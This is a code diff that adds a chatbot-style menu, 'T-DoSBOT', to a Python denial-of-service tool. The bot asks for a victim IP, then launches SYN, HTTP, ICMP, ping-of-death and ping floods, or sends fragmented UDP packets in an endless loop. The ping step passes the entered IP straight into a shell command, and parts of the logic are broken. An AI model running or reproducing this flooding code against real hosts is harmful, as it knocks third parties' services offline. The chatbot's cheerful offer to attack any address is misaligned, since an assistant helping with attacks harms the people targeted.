@@ -182,6 +182,69 @@ def main():
             counter+=1
             while(1):
                 send(fragment)
-	
+    elif option == 8:
+        print("T-DoSBOT: Hi, i'm T-DoSBOT, a simple ChatBot to help you DoS/DDoS! You can ask me to DoS any IP Address by just simply typing DOS; BUT before that...")
+        name = input("Whats your name?: ")
+        print("T-DoSBOT: Nice to meet you " + name)
+        aaa = input("T-DoSBOT: How can i help you today?: ")
+        if aaa in ['dos', 'ddos', 'DDoS', 'DoS', 'DOS', 'DDOS', 'Dos', 'Ddos']:
+            victim = input("T-DoSBOT: Which IP Address do you want me to DoS?: ")
+            print("T-DoSBOT: Ok, I'm gonna DoS " + victim)
+            print("T-DoSBOT: Checking if Target is reachable...")
+            ggg = os.system("ping " + victim)
+            if "0 received" in ggg:
+                print("T-DoSBOT: Target is unreachable, exiting...")
+                exit()
+            else:
+                print("T-DoSBOT: Target is reachable, continuing...")
+                print("      [Menu]      ")
+                print("1) SYN Flood Attack (Doesn't work on Termux)")
+                print("2) HTTP Flood Attack")
+                print("3) Slowloris Ping Attack")
+                print("4) Ping Flood Attack")
+                print("5) Ping of Death Attack (Doesn't work on Termux)")
+                print("6) ICMP Flood Attack (Doesn't work on Termux)")
+                print("7) IP Fragmentation Attack")
+                print("8) ChatBot(Beta)")
+                ccc = input("T-DoSBOT: What DoS attack do you want me to do? (Insert number): ")
+                if ccc == "1":
+                    print("T-DoSBOT: Ok, i'm gonna SYN Flood " + victim)
+                    SYN_Flood(victim, 443, 5000)
+                elif ccc == "2":
+                    print("T-DoSBOT: Ok, i'm gonna HTTP Flood " + victim)
+                    Attack(victim, 80)
+                elif ccc == "3":
+                    print("T-DoSBOT: Ok, i'm gonna Slowloris Ping " + victim)
+                    Ping_flood()
+                elif ccc == "4":
+                    print("T-DoSBOT: Ok, i'm gonna Ping Flood " + victim)
+                    Ping_flood()
+                elif ccc == "5":
+                    print("T-DoSBOT: Ok, i'm gonna Ping of Death " + victim)
+                    Pingofdeath()
+                elif ccc == "6":
+                    print("T-DoSBOT: Ok, i'm gonna ICMP Flood " + victim)
+                    Icmpflood()
+                elif ccc == "7":
+                    print("T-DoSBOT: Ok, i'm gonna IP Fragment " + victim)
+                    dip=str(input("Target IP: "))
+                    payload="A"*496+"B"*500
+                    packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
+                    
+                    global fragment
+                    frags=fragment(packet,fragsize=500)
+                    
+                    counter=1
+                    for fragment in frags:
+                        print("Packet Number: "+str(counter))
+                        print("===================================================")
+                        fragment.show() #displays each fragment
+                    counter+=1
+                    while(1):
+                        send(fragment)
+                    else:
+                        print("T-DoSBOT: Sorry, i don't understand that command :(")
+        else:
+            print("T-DoSBOT: Sorry, i don't understand that command :(")
 if __name__ == "__main__":
     main()
